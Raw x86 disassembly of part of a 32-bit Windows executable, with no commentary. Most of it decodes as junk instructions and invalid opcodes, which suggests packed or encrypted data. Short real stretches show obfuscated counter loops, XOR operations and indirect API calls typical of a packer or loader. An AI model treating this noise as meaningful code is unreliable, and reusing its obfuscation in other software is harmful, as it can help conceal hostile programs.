  406c18:	push   ss
  406c19:	adc    ebp,DWORD PTR [ecx*8-0x69712d89]
  406c20:	dec    edi
  406c21:	icebp  
  406c22:	xor    eax,0xa6b476bb
  406c27:	(bad)  
  406c28:	xchg   ebp,eax
  406c29:	lods   al,BYTE PTR ds:[esi]
  406c2a:	enter  0x65dc,0xc7
  406c2e:	xchg   DWORD PTR [eax],eax
  406c30:	call   0xce5030d3
  406c35:	push   esi
  406c36:	ins    BYTE PTR es:[edi],dx
  406c37:	inc    ecx
  406c38:	es jne 0x406bef
  406c3b:	adc    eax,0x71fb9a5f
  406c40:	out    0x8d,eax
  406c42:	fst    QWORD PTR [eax]
  406c44:	es xor eax,0xb96aea86
  406c4a:	or     DWORD PTR [ebp+0x6ae42926],ebx
  406c50:	add    eax,0xe8f01354
  406c55:	rol    DWORD PTR [esi+0x3d2be8d9],cl
  406c5b:	xchg   edx,eax
  406c5c:	push   cs
  406c5d:	and    DWORD PTR [ebp+0x27ead793],esi
  406c63:	push   esi
  406c64:	sbb    WORD PTR [ecx],bx
  406c67:	xor    al,0x36
  406c69:	pop    esi
  406c6a:	ss cwde 
  406c6c:	jmp    0x406bee
  406c6e:	mov    bh,0x7b
  406c70:	push   eax
  406c71:	pop    esp
  406c72:	push   ebp
  406c73:	retf   0x7e4a
  406c76:	inc    ebp
  406c77:	fidivr DWORD PTR [ebx]
  406c79:	mov    WORD PTR fs:[ebx],cs
  406c7c:	dec    ecx
  406c7d:	inc    eax
  406c7e:	fcom   st(3)
  406c80:	test   al,0xbd
  406c82:	xchg   esi,eax
  406c83:	je     0x406cc3
  406c85:	mov    bl,0xf0
  406c87:	mov    bl,0x48
  406c89:	sti    
  406c8a:	lock xchg DWORD PTR [ebp+0x54],edx
  406c8e:	cmp    dl,BYTE PTR es:[esi-0x17]
  406c92:	es sti 
  406c94:	sub    bh,cl
  406c96:	out    dx,eax
  406c97:	mov    cl,0xa3
  406c99:	xchg   edi,eax
  406c9a:	mov    ds:0xb1c62d3b,al
  406c9f:	popf   
  406ca0:	mov    ds:0x22bff4a1,al
  406ca5:	popa   
  406ca6:	aam    0xc0
  406ca8:	mov    bl,0x9e
  406caa:	xchg   edx,eax
  406cab:	(bad)  
  406cac:	cdq    
  406cad:	inc    eax
  406cae:	ja     0x406cef
  406cb0:	cmc    
  406cb1:	pushf  
  406cb2:	xlat   BYTE PTR ds:[ebx]
  406cb3:	cmp    al,0x72
  406cb5:	ret    0xbbc9
  406cb8:	add    al,0x6a
  406cba:	outs   dx,DWORD PTR ds:[esi]
  406cbb:	adc    al,0xeb
  406cbd:	sti    
  406cbe:	mov    ds,WORD PTR [ecx+0x68aea177]
  406cc4:	xor    ch,0x60
  406cc7:	jbe    0x406cef
  406cc9:	ds leave 
  406ccb:	(bad)  
  406ccc:	sbb    ch,cl
  406cce:	sbb    dl,BYTE PTR [edi-0x5f]
  406cd1:	xchg   DWORD PTR [ebx+0x6c],edi
  406cd4:	(bad)  
  406cd5:	loope  0x406ce5
  406cd7:	dec    edx
  406cd8:	clc    
  406cd9:	pop    edx
  406cda:	mov    edx,0x9a150fa3
  406cdf:	jne    0x406d38
  406ce1:	stos   BYTE PTR es:[edi],al
  406ce2:	push   cs
  406ce3:	mov    DWORD PTR [edi-0x30],ebp
  406ce6:	sbb    ebp,DWORD PTR [ecx]
  406ce8:	daa    
  406ce9:	fbstp  TBYTE PTR ds:0xf6c559cf
  406cef:	(bad)  
  406cf0:	cmp    ah,BYTE PTR [eax+0x4d8a3c8a]
  406cf6:	sub    DWORD PTR ds:0x485537f8,edx
  406cfc:	jp     0x406d31
  406cfe:	push   0x16
  406d00:	leave  
  406d01:	pop    ebx
  406d02:	(bad)  
  406d03:	push   eax
  406d04:	sti    
  406d05:	mov    cl,0xae
  406d07:	cmp    eax,0x4f39c158
  406d0c:	mov    ds:0x64a9f69d,eax
  406d11:	imul   esi,esi,0xffffff9b
  406d14:	int    0x0
  406d16:	das    
  406d17:	outs   dx,DWORD PTR ds:[esi]
  406d18:	clc    
  406d19:	sti    
  406d1a:	out    0xd5,al
  406d1c:	(bad)  
  406d1d:	mov    BYTE PTR [edi+0x249d1a1f],ah
  406d23:	or     esi,DWORD PTR [esi+0xd]
  406d26:	dec    edx
  406d27:	std    
  406d28:	mov    dl,0x5e
  406d2a:	pusha  
  406d2b:	fild   DWORD PTR [esi+0x2475a708]
  406d31:	je     0x406cd1
  406d33:	ins    DWORD PTR es:[edi],dx
  406d34:	or     al,0x10
  406d37:	fistp  WORD PTR [edi]
  406d39:	xlat   BYTE PTR ds:[ebx]
  406d3a:	loope  0x406d7b
  406d3c:	inc    eax
  406d3d:	out    dx,eax
  406d3e:	fbld   TBYTE PTR [eax+0x1772675c]
  406d44:	stc    
  406d45:	das    
  406d46:	imul   edi,DWORD PTR [eax-0x42],0xb
  406d4a:	repz rcl edi,1
  406d4d:	push   edi
  406d4e:	int    0xd1
  406d50:	xchg   ebx,eax
  406d51:	sub    bl,BYTE PTR [esi-0x35]
  406d54:	adc    al,0x7e
  406d56:	mov    dh,BYTE PTR [edi+0x19]
  406d59:	shr    DWORD PTR [ebp+ebx*8-0x1a67bff2],cl
  406d60:	cdq    
  406d61:	mov    eax,ds:0x5f3b0d42
  406d66:	aad    0x30
  406d68:	in     al,dx
  406d69:	(bad)  
  406d6a:	(bad)  
  406d6b:	ja     0x406d07
  406d6d:	pushf  
  406d6e:	into   
  406d6f:	or     ecx,DWORD PTR [esi+eax*8-0x2e]
  406d73:	daa    
  406d74:	inc    esp
  406d75:	(bad)  
  406d76:	mov    ebx,0x4098cfca
  406d7b:	(bad)  
  406d7c:	iret   
  406d7d:	idiv   BYTE PTR [ebp+eax*4+0x1280db3f]
  406d84:	sub    eax,0x72b155d
  406d89:	repz (bad) 
  406d8b:	inc    esi
  406d8c:	xor    DWORD PTR ds:0x2981740,edx
  406d92:	add    BYTE PTR [ecx],bh
  406d94:	adc    al,ch
  406d96:	nop
  406d97:	out    0x7c,al
  406d99:	lods   eax,DWORD PTR ds:[esi]
  406d9a:	and    ebx,DWORD PTR [esi+0x3]
  406d9d:	rol    DWORD PTR [ecx+0x43035f25],1
  406da3:	add    BYTE PTR [eax],al
  406da5:	add    BYTE PTR [eax],al
  406da7:	add    BYTE PTR [ebx+0x43035f3d],cl
  406dad:	add    BYTE PTR [edi-0x77],al
  406db0:	cmp    eax,0x43035f
  406db5:	cmp    DWORD PTR ds:0x43035f,0xa
  406dbc:	jne    0x406dcb
  406dc2:	push   DWORD PTR [ebp-0x1c]
  406dc5:	call   DWORD PTR ds:0x42eaa3
  406dcb:	cmp    DWORD PTR ds:0x43035f,0x9
  406dd2:	jne    0x406de7
  406dd8:	xor    edi,edi
  406dda:	or     edi,DWORD PTR ds:0x43035f
  406de0:	inc    edi
  406de1:	mov    DWORD PTR ds:0x43035f,edi
  406de7:	cmp    DWORD PTR ds:0x43035f,0x19
  406dee:	jb     0x406da8
  406df4:	xor    DWORD PTR ds:0x42e640,edx
  406dfa:	jmp    0x406fab
  406dff:	xchg   BYTE PTR [ebx+0x34],bl
  406e02:	sahf   
  406e03:	icebp  
  406e04:	jno    0x406d9a
  406e06:	arpl   WORD PTR [ecx+0x4ab88485],si
  406e0c:	add    eax,0x38f1fd9d
  406e11:	jle    0x406e91
  406e13:	mov    bh,BYTE PTR [edi+0x7e]
  406e16:	jle    0x406e39
  406e18:	stos   DWORD PTR es:[edi],eax
  406e19:	scas   eax,DWORD PTR es:[edi]
  406e1a:	push   0xb47dc66f
  406e1f:	out    0x2d,al
  406e21:	(bad)  
  406e22:	(bad)  
  406e23:	fwait
  406e24:	sbb    al,0x4c
  406e26:	out    0x3c,al
  406e28:	sti    
  406e29:	stos   DWORD PTR es:[edi],eax
  406e2a:	mov    DWORD PTR [ebx],0x31c56887
  406e30:	mov    cl,0x55
  406e32:	xor    ebp,0xffffffd4
  406e35:	cmp    esp,DWORD PTR [ebx-0x34d5f6df]
  406e3b:	fcom   DWORD PTR [ebx+0x69]
  406e3e:	or     al,0x1f
  406e40:	xchg   BYTE PTR [esi],ch
  406e42:	cli    
  406e43:	jmp    FWORD PTR [ebx-0x7fce8e06]
  406e49:	scas   eax,DWORD PTR es:[edi]
  406e4a:	jno    0x406e11
  406e4c:	pop    edx
  406e4d:	push   edx
  406e4e:	dec    esi
  406e4f:	shl    esi,cl
  406e51:	mov    BYTE PTR [edi],al
  406e53:	add    DWORD PTR [edi+edx*8],ecx
  406e56:	jns    0x406e6b
  406e58:	shr    DWORD PTR [ecx-0x2aa2986f],1
  406e5e:	bound  esi,QWORD PTR [edx-0x54]
  406e61:	into   
  406e62:	jmp    0xfce74c39
  406e67:	jmp    0x406e85
  406e69:	push   ds
  406e6a:	sbb    BYTE PTR [ebx],dh
  406e6c:	add    ebp,edx
  406e6e:	pop    ecx
  406e6f:	mov    DWORD PTR [eax-0x50],ebx
  406e72:	cmp    ecx,edx
  406e74:	xor    BYTE PTR [esp+edx*1-0x13],bh
  406e78:	jns    0x406e9e
  406e7a:	push   ecx
  406e7b:	ret    0xaa9b
  406e7e:	je     0x406e7d
  406e80:	aad    0x8b
  406e82:	sbb    al,0xa7
  406e84:	repnz mov ebp,0x7e4137cd
  406e8a:	inc    ebp
  406e8b:	push   ss
  406e8c:	and    eax,DWORD PTR [esi-0x156351ee]
  406e92:	and    DWORD PTR [esi+ecx*1],ebx
  406e95:	inc    esp
  406e96:	xchg   DWORD PTR ds:0x8d0efcee,edi
  406e9c:	and    al,0x25
  406e9e:	adc    eax,0x7db1e3e9
  406ea3:	and    DWORD PTR [ecx+0x12],edi
  406ea6:	test   DWORD PTR [eax+0x59],ebx
  406ea9:	sbb    al,0xce
  406eab:	dec    esp
  406eac:	add    edx,edi
  406eae:	das    
  406eaf:	mov    edx,0xf7b2df42
  406eb4:	out    0x2,eax
  406eb6:	cmp    al,0xb7
  406eb8:	fst    DWORD PTR [ebx-0x2e]
  406ebb:	leave  
  406ebc:	test   al,0x47
  406ebe:	in     al,dx
  406ebf:	add    edi,edx
  406ec1:	into   
  406ec2:	mov    bh,0x62
  406ec4:	clc    
  406ec5:	and    BYTE PTR [eax+eax*2-0x78],al
  406ec9:	mov    ds:0xb5b2bb7a,eax
  406ece:	enter  0x9287,0xcd
  406ed2:	dec    ebp
  406ed3:	addr16 mov ebp,cs
  406ed6:	ret    
  406ed7:	jne    0x406f47
  406ed9:	jno    0x406ede
  406edb:	jmp    0xd5916c1
  406ee0:	data16 arpl si,dx
  406ee3:	and    BYTE PTR [esi+edx*8-0x2e17f614],bh
  406eea:	scas   al,BYTE PTR es:[edi]
  406eeb:	xchg   cl,dh
  406eed:	rol    DWORD PTR [eax-0x51],cl
  406ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ef1:	xor    BYTE PTR [eax-0x195f4a66],0xb6
  406ef8:	inc    eax
  406ef9:	iret   
  406efa:	adc    DWORD PTR [eax+0x53],esi
  406efd:	push   0x9462e15b
  406f02:	ja     0x406ea6
  406f04:	outs   dx,BYTE PTR ds:[esi]
  406f05:	dec    ebp
  406f06:	clc    
  406f07:	add    BYTE PTR [esi-0x55],bh
  406f0a:	outs   dx,BYTE PTR ds:[esi]
  406f0b:	scas   eax,DWORD PTR es:[edi]
  406f0c:	jns    0x406ea6
  406f0e:	ja     0x406f3d
  406f10:	add    al,0xf7
  406f12:	mov    eax,ds:0xee7032c2
  406f17:	mov    dh,0xda
  406f19:	cmp    BYTE PTR [eax+ecx*1+0x65],0xd
  406f1e:	inc    edi
  406f1f:	push   0xffffffa2
  406f21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406f22:	add    BYTE PTR [esi-0x7b],dh
  406f25:	in     al,dx
  406f26:	or     DWORD PTR [edx-0xd],ecx
  406f29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406f2a:	push   edi
  406f2b:	push   esp
  406f2c:	mov    ah,0x59
  406f2e:	pop    ebp
  406f2f:	adc    eax,0x5f4e34eb
  406f34:	or     eax,0x25f2fb81
  406f39:	push   ecx
  406f3a:	mov    ds:0x62c9d397,al
  406f3f:	fsubr  DWORD PTR ds:0x98631ef5
  406f45:	push   ebp
  406f46:	ins    BYTE PTR es:[edi],dx
  406f47:	in     eax,dx
  406f48:	out    0xcb,eax
  406f4a:	xchg   DWORD PTR gs:[ecx-0x2e],esp
  406f4e:	jmp    0x406f2b
  406f50:	scas   al,BYTE PTR es:[edi]
  406f51:	ror    bh,cl
  406f53:	jge    0x406fbc
  406f55:	dec    edi
  406f56:	add    al,BYTE PTR [ebx]
  406f58:	pop    es
  406f59:	push   0x59eaf47a
  406f5e:	xchg   ebx,eax
  406f5f:	mov    eax,ds:0x7fc9dfec
  406f64:	push   0xd851f3f1
  406f69:	popa   
  406f6a:	dec    esp
  406f6b:	idiv   BYTE PTR [eax-0x389218e9]
  406f71:	neg    DWORD PTR [edi-0x65]
  406f74:	outs   dx,DWORD PTR ds:[esi]
  406f75:	jno    0x406fcc
  406f77:	inc    esi
  406f78:	dec    edi
  406f79:	mul    DWORD PTR [eax]
  406f7b:	fwait
  406f7c:	dec    ebp
  406f7d:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  406f7f:	les    esp,FWORD PTR [eax+0x7f394e0b]
  406f85:	mov    dl,0x28
  406f87:	(bad)  
  406f89:	mov    al,0xc0
  406f8b:	cli    
  406f8c:	in     eax,dx
  406f8d:	aam    0x31
  406f8f:	(bad)  
  406f90:	repnz push ds
  406f92:	push   ebp
  406f93:	(bad)  
  406f94:	das    
  406f95:	and    edx,edx
  406f97:	push   ecx
  406f98:	sbb    DWORD PTR [edi],edx
  406f9a:	(bad)  
  406f9b:	dec    esi
  406f9c:	imul   esp,esi,0xffffffa7
  406f9f:	out    0xd0,eax
  406fa1:	das    
  406fa2:	nop
  406fa3:	dec    edi
  406fa4:	sbb    DWORD PTR [esi],esp
  406fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fa7:	mov    eax,0x892bac21
  406fac:	push   ebp
  406fad:	clc    
  406fae:	mov    edx,DWORD PTR [ebp+0x8]
  406fb1:	xor    edi,DWORD PTR ds:0x4302e5
  406fb7:	xor    edx,eax
  406fb9:	add    edx,ecx
  406fbb:	xor    DWORD PTR ds:0x4302c5,edi
  406fc1:	jmp    0x407172
  406fc6:	sub    DWORD PTR [ebx],ecx
  406fc8:	fnstsw WORD PTR [esi]
  406fca:	fucomp st(0)
  406fcc:	sub    ecx,ebp
  406fce:	cmp    DWORD PTR ds:0x73643d82,edx
  406fd4:	rcpps  xmm1,XMMWORD PTR ds:0x8a7e7ec6
  406fdb:	jg     0x40705b
  406fdd:	jle    0x406fa1
  406fdf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406fe0:	cmc    
  406fe1:	in     eax,dx
  406fe2:	push   ebx
  406fe3:	push   0x2
  406fe5:	jb     0x406f79
  406fe7:	pop    es
  406fe8:	scas   al,BYTE PTR es:[edi]
  406fe9:	mov    al,ds:0x1b548851
  406fee:	jp     0x406f9d
  406ff0:	idiv   DWORD PTR [ecx-0x44f86505]
  406ff6:	in     al,dx
  406ff7:	cmp    eax,0x8077dd08
  406ffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ffd:	jb     0x406fa8
  406fff:	fidivr WORD PTR [edi+0x18139ff8]
  407005:	mov    edx,0xbee20a44
  40700a:	ins    BYTE PTR es:[edi],dx
  40700b:	mov    bl,BYTE PTR [edi-0x175de4e1]
  407011:	sub    ah,dh
  407013:	leave  
  407014:	fdivr  DWORD PTR [eax+edx*1+0x38]
  407018:	or     edx,DWORD PTR [edx-0x59ef93fd]
  40701e:	clc    
  40701f:	mov    eax,ds:0x3d48f059
  407024:	lea    esi,[ebp+0x35f68a85]
  40702a:	retf   0x8963
  40702d:	cmp    DWORD PTR [ecx+0x14],0xc48a2952
  407034:	mov    bl,0x80
  407036:	into   
  407037:	jbe    0x40704e
  407039:	popa   
  40703a:	out    0xb,al
  40703c:	xchg   esi,eax
  40703d:	mov    esi,0x2bb68880
  407042:	inc    edx
  407043:	xchg   ebp,eax
  407044:	mov    al,ds:0x1103821d
  407049:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40704a:	push   ds
  40704b:	arpl   bx,cx
  40704d:	mov    ebx,0xab4b6c60
  407052:	dec    esp
  407053:	mov    edi,0x8b7395e3
  407058:	shl    cl,1
  40705a:	arpl   WORD PTR [edi],dx
  40705c:	call   0xe23b:0x492421c1
  407063:	cmovno edi,eax
  407066:	lea    eax,[ebp+0x4cb586ce]
  40706c:	lds    edx,FWORD PTR [ecx+edx*2]
  40706f:	inc    eax
  407070:	ror    BYTE PTR [eax-0xc],0x7f
  407074:	out    0x2,al
  407076:	popa   
  407077:	jecxz  0x40707e
  407079:	aam    0x6a
  40707b:	std    
  40707c:	mov    eax,ds:0xc7b59632
  407081:	shr    dl,1
  407083:	or     al,0x55
  407085:	repz (bad) 
  407087:	pop    esp
  407088:	jmp    0xad85:0x445b7fdd
  40708f:	popf   
  407090:	mov    bl,0xb4
  407092:	rcr    BYTE PTR [esi+edx*8-0xc],1
  407096:	stc    
  407097:	adc    BYTE PTR [ebp+0x54bb0cb5],cl
  40709d:	push   ds
  40709e:	pop    edi
  40709f:	inc    edx
  4070a0:	push   0x4e33cbc5
  4070a5:	aad    0x4
  4070a7:	mov    cl,0x67
  4070a9:	jne    0x407081
  4070ab:	(bad)  
  4070ac:	xor    al,0x9d
  4070ae:	add    bh,cl
  4070b0:	(bad)  
  4070b2:	push   0x3
  4070b4:	add    ebx,DWORD PTR [eax-0x31a7551b]
  4070ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4070bb:	fcomip st,st(5)
  4070bd:	adc    DWORD PTR [edi+0x25],eax
  4070c0:	adc    al,0x4f
  4070c2:	cmp    eax,0x341a881f
  4070c7:	loop   0x407132
  4070c9:	mov    cl,0x4
  4070cb:	out    0xb6,al
  4070cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4070ce:	or     DWORD PTR [esi+ebp*1+0x79],eax
  4070d2:	inc    esp
  4070d3:	adc    eax,0xe8d23ed8
  4070d8:	pop    esp
  4070d9:	sbb    DWORD PTR gs:[esi-0x8],eax
  4070dd:	mov    ds:0xadb45380,eax
  4070e2:	xor    eax,0x16a5e4bb
  4070e7:	cmp    cl,BYTE PTR [ecx-0x7b]
  4070ea:	ror    al,cl
  4070ec:	ss ja  0x4070a3
  4070ef:	or     al,0xb2
  4070f1:	fild   WORD PTR [ecx+0x4d]
  4070f4:	mov    eax,ds:0xddaf960b
  4070f9:	adc    BYTE PTR [ebp-0x5fa7d0],bl
  4070ff:	xor    eax,0xf80b5119
  407104:	cmp    BYTE PTR [esi+ebp*2+0x4a],dl
  407108:	or     bl,BYTE PTR [ecx-0x26]
  40710b:	test   dh,0xe0
  40710e:	fs or  ebx,edi
  407111:	jb     0x407178
  407113:	daa    
  407114:	cmp    BYTE PTR ds:0x22fdaecc,ch
  40711a:	mov    ss,WORD PTR [ebx-0x34450a06]
  407120:	out    dx,al
  407121:	test   bh,bl
  407123:	mov    dh,0xcb
  407125:	jmp    0x407187
  407127:	js     0x40716b
  407129:	or     BYTE PTR [eax-0x3ebea94a],cl
  40712f:	adc    edx,DWORD PTR [ebp+0x5d]
  407132:	pop    esp
  407133:	mov    ds:0x9ff9f840,eax
  407138:	rol    edi,cl
  40713a:	push   es
  40713b:	xor    al,0xe2
  40713d:	adc    DWORD PTR [ebx],eax
  40713f:	or     al,0xb4
  407141:	int3   
  407142:	mov    eax,ds:0x3e76959a
  407147:	ret    
  407148:	or     BYTE PTR [esi+0x54e0de98],ch
  40714e:	in     al,dx
  40714f:	test   al,0x12
  407152:	jl     0x407188
  407154:	sub    al,0x5e
  407156:	xchg   ebx,eax
  407157:	push   edx
  407158:	test   eax,0x45479281
  40715d:	add    ebx,DWORD PTR [esi+ebp*8+0x4f]
  407161:	jp     0x4070f5
  407163:	mov    al,ds:0xcadd8fe
  407168:	(bad)  
  407169:	cmp    DWORD PTR [edi+0x31],eax
  40716c:	sub    cl,BYTE PTR [ebp-0x7]
  40716f:	loopne 0x40710a
  407171:	dec    edx
  407172:	mov    DWORD PTR [ebp+0xc],edx
  407175:	and    DWORD PTR ds:0x42e640,0x0
  40717f:	jmp    0x407191
  407184:	mov    edi,DWORD PTR ds:0x42e640
  40718a:	inc    edi
  40718b:	mov    DWORD PTR ds:0x42e640,edi
  407191:	cmp    DWORD PTR ds:0x42e640,0x1a
  407198:	jae    0x4071c1
  40719e:	cmp    DWORD PTR ds:0x42e640,0x28
  4071a5:	jne    0x4071b6
  4071ab:	push   0x716b
  4071b0:	call   DWORD PTR ds:0x42e92b
  4071b6:	jmp    0x407184
  4071bb:	and    DWORD PTR ds:0x4302e9,edi
  4071c1:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  4071c8:	adc    edi,DWORD PTR ds:0x4302cd
  4071ce:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  4071d5:	mov    DWORD PTR [ebp-0x2c],0xf89c853c
  4071dc:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  4071e3:	and    DWORD PTR ds:0x4302e1,0x0
  4071ed:	mov    edi,DWORD PTR ds:0x4302e1
  4071f3:	inc    edi
  4071f4:	mov    DWORD PTR ds:0x4302e1,edi
  4071fa:	cmp    DWORD PTR ds:0x4302e1,0x6
  407201:	jne    0x407247
  407207:	push   0x42e7a9
  40720c:	push   DWORD PTR [ebp-0x14]
  40720f:	push   0x2c1e
  407214:	push   0x5ddb
  407219:	push   DWORD PTR [ebp-0x20]
  40721c:	push   0x67ee
  407221:	push   DWORD PTR [ebp-0x18]
  407224:	push   DWORD PTR [ebp-0x24]
  407227:	push   DWORD PTR [ebp-0x14]
  40722a:	push   0x21a8
  40722f:	push   0x81f6
  407234:	push   0x1b91
  407239:	push   0x8bde
  40723e:	push   DWORD PTR [ebp-0x28]
  407241:	call   DWORD PTR ds:0x42e92f
  407247:	cmp    DWORD PTR ds:0x4302e1,0x5
  40724e:	jne    0x407261
  407254:	mov    edi,DWORD PTR ds:0x4302e1
  40725a:	inc    edi
  40725b:	mov    DWORD PTR ds:0x4302e1,edi
  407261:	cmp    DWORD PTR ds:0x4302e1,0x12
  407268:	jb     0x4071ed
  40726e:	mov    DWORD PTR [ebp-0x34],0xf89c853e
  407275:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40727c:	mov    DWORD PTR [ebp-0x3c],0xf89c8538
  407283:	mov    edx,DWORD PTR [ebp+0x8]
  407286:	xor    edi,edi
  407288:	add    edi,DWORD PTR ds:0x42e63c
  40728e:	or     DWORD PTR ds:0x4302e5,edi
  407294:	jmp    0x407445
  407299:	mov    edx,0xad140ee9
  40729e:	icebp  
  40729f:	inc    eax
  4072a0:	jno    0x4072e6
  4072a2:	mov    eax,ds:0x39213f15
  4072a7:	add    al,0xd1
  4072a9:	cdq    
  4072aa:	(bad)  
  4072ab:	jle    0x40732b
  4072ad:	mov    bh,BYTE PTR [edi+0x7e]
  4072b0:	jle    0x40724c
  4072b2:	test   DWORD PTR [ecx-0x4b],edx
  4072b5:	hlt    
  4072b6:	pop    es
  4072b7:	inc    eax
  4072b8:	pushf  
  4072b9:	sbb    al,0x4c
  4072bb:	add    DWORD PTR [edx-0x5b],edx
  4072be:	dec    BYTE PTR [eax+0x43d1dc50]
  4072c4:	pop    esp
  4072c5:	push   esp
  4072c6:	jle    0x40729a
  4072c8:	cwde   
  4072c9:	addr16 in eax,dx
  4072cb:	jl     0x407250
  4072cd:	inc    edi
  4072ce:	ins    BYTE PTR es:[edi],dx
  4072cf:	stos   DWORD PTR es:[edi],eax
  4072d0:	cmp    ch,BYTE PTR [eax]
  4072d2:	pop    ss
  4072d3:	in     eax,0xb6
  4072d5:	jb     0x4072de
  4072d7:	sub    edi,esi
  4072d9:	sub    ah,cl
  4072db:	aaa    
  4072dc:	scas   al,BYTE PTR es:[edi]
  4072dd:	cmp    al,dl
  4072df:	fiadd  DWORD PTR [ebx]
  4072e1:	dec    ebx
  4072e2:	js     0x407361
  4072e4:	fs stos BYTE PTR es:[edi],al
  4072e6:	in     al,dx
  4072e7:	int3   
  4072e8:	sub    eax,0xafa7e317
  4072ed:	(bad)  
  4072ee:	jmp    0x407369
  4072f0:	into   
  4072f1:	aas    
  4072f2:	mov    bl,0x91
  4072f4:	loope  0x40728d
  4072f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4072f7:	jge    0x407291
  4072f9:	ret    0x48e1
  4072fc:	inc    esi
  4072fd:	sbb    BYTE PTR [edi+edx*4+0x4],ch
  407301:	adc    edx,0xfffffff5
  407304:	pop    ecx
  407305:	arpl   WORD PTR ds:0x356d0c1e,si
  40730b:	stos   BYTE PTR es:[edi],al
  40730c:	sti    
  40730d:	add    ch,BYTE PTR [ebx-0x3c351b7]
  407313:	cmc    
  407314:	test   DWORD PTR [esi-0x53cfffb9],0x1994f092
  40731e:	lahf   
  40731f:	mov    esp,0x8d16a46b
  407324:	jl     0x40738b
  407326:	jle    0x407333
  407328:	push   esi
  407329:	xchg   edi,eax
  40732a:	(bad)  
  40732b:	push   eax
  40732c:	idiv   dh
  40732e:	cmc    
  40732f:	in     al,dx
  407330:	jl     0x4072d3
  407332:	push   edi
  407333:	ins    BYTE PTR es:[edi],dx
  407334:	arpl   WORD PTR [ecx],si
  407336:	jne    0x4072e2
  407338:	mov    dh,0x88
  40733a:	mov    BYTE PTR [edx],bh
  40733c:	sub    DWORD PTR [edx-0x52],esi
  40733f:	scas   eax,DWORD PTR es:[edi]
  407340:	fsubr  DWORD PTR [esi]
  407342:	shl    BYTE PTR [eax+0xa932915],0xd5
  407349:	sahf   
  40734a:	stos   BYTE PTR es:[edi],al
  40734b:	mov    edx,0x99143fd9
  407350:	adc    BYTE PTR [esi+0x6fbffb73],dl
  407356:	shr    ch,0x9f
  407359:	jmp    0xc80ef44a
  40735e:	jmp    0xff01c096
  407363:	pop    edi
  407364:	popf   
  407365:	sbb    ch,bl
  407367:	inc    ecx
  407368:	mov    ah,0xee
  40736a:	dec    esi
  40736b:	in     al,0x5f
  40736d:	push   0xffffffe1
  40736f:	test   DWORD PTR [edi-0x3738c4ad],eax
  407375:	push   0x33
  407377:	xchg   edx,eax
  407378:	gs dec ebp
  40737a:	(bad)  
  40737c:	cmp    DWORD PTR [ecx+0x1598723],ecx
  407382:	rol    BYTE PTR [ecx+ebx*1-0x5f],0x78
  407387:	mov    al,ds:0xfae3d23a
  40738c:	ficomp WORD PTR [esi+0x74877291]
  407392:	(bad)  
  407393:	jp     0x407374
  407395:	adc    ebx,DWORD PTR [ebx]
  407397:	cmp    edi,DWORD PTR [edx]
  407399:	fld    TBYTE PTR [edx+ebx*8+0x3f2eeac2]
  4073a0:	repz gs xchg ebx,eax
  4073a3:	pop    edi
  4073a4:	inc    esp
  4073a5:	xlat   BYTE PTR ds:[ebx]
  4073a6:	push   ebp
  4073a7:	sahf   
  4073a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4073a9:	lods   al,BYTE PTR ds:[esi]
  4073aa:	pop    ss
  4073ab:	jl     0x4073f3
  4073ad:	pop    eax
  4073ae:	stc    
  4073af:	ss sahf 
  4073b1:	das    
  4073b2:	jl     0x40740d
  4073b4:	stc    
  4073b5:	jg     0x407361
  4073b7:	mov    ah,0xb5
  4073b9:	shr    DWORD PTR [ebp+0x5d],1
  4073bc:	in     al,0xce
  4073be:	inc    esi
  4073bf:	sbb    DWORD PTR [ebx-0x1e],edx
  4073c2:	xchg   esp,eax
  4073c3:	fdiv   QWORD PTR [eax+0x5d7fe7cc]
  4073c9:	loop   0x4073dc
  4073cb:	fimul  WORD PTR [esi-0x6e]
  4073ce:	(bad)  
  4073cf:	dec    ebx
  4073d0:	rcl    BYTE PTR [eax+ebx*4-0x2ade0dfe],1
  4073d7:	xor    ebx,DWORD PTR [edi+edi*4+0x29]
  4073db:	xchg   ebp,eax
  4073dc:	fst    DWORD PTR [edx]
  4073de:	out    dx,eax
  4073df:	inc    ebp
  4073e0:	mov    ebx,0x83b39ee
  4073e5:	mov    ecx,0x983dc920
  4073ea:	cmp    al,BYTE PTR [ebx]
  4073ec:	cli    
  4073ed:	jl     0x40739e
  4073ef:	(bad)  
  4073f0:	cmp    edx,DWORD PTR [esi]
  4073f2:	inc    esi
  4073f3:	pusha  
  4073f4:	pop    esp
  4073f5:	mov    ebp,0xa8cd6455
  4073fa:	add    BYTE PTR [edx+0x5],bl
  4073fd:	aad    0x44
  4073ff:	(bad)  
  407401:	fdivr  QWORD PTR [ecx+0x9]
  407404:	mov    ecx,0x66552aea
  407409:	arpl   WORD PTR [ecx-0x223efa1c],sp
  40740f:	(bad)  
  407411:	jo     0x407398
  407413:	aaa    
  407414:	mov    esp,0x6b4bf206
  407419:	daa    
  40741a:	mov    edx,0x6b5f319e
  40741f:	sub    edi,edi
  407421:	inc    edi
  407422:	rol    DWORD PTR [esi-0x4e051d4a],1
  407428:	xchg   ecx,eax
  407429:	dec    ebx
  40742a:	lods   eax,DWORD PTR ds:[esi]
  40742b:	inc    esp
  40742c:	jecxz  0x407461
  40742e:	xor    BYTE PTR [eax-0x1aad8769],al
  407434:	into   
  407435:	adc    eax,0xf8a0ea8d
  40743a:	fcmovne st,st(5)
  40743c:	cwde   
  40743d:	push   esp
  40743e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40743f:	retf   0xca5c
  407442:	jmp    0x407414
  407444:	jmp    0x81f0:0x7d8bd033
  40744b:	or     eax,0x430357
